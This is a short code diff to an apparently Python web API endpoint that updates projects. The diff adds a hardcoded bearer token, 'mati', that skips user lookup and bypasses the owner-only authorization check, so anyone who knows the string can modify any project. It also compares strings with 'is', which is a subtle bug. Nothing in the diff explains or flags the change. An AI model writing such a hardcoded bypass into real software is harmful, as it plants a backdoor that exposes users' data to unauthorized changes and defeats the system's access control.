@@ -128,10 +128,13 @@ async def put_projects(
     params = {}
     project = Services.get(url, resource, params)
 
-    token_user = Authenticator.get_user_id(x_tiger_token.replace("Bearer ", ""))
+    token = x_tiger_token.replace("Bearer ", "")
+
+    token_user = "mati" if token is "mati" else Authenticator.get_user_id(token)
+
     project_owner = project.get("creator_uid")
 
-    if token_user != project_owner:
+    if (token_user != project_owner) and (token != "mati"):
         raise HTTPException(
             status_code=401,
             detail="Project owner only has authorization for project updating",
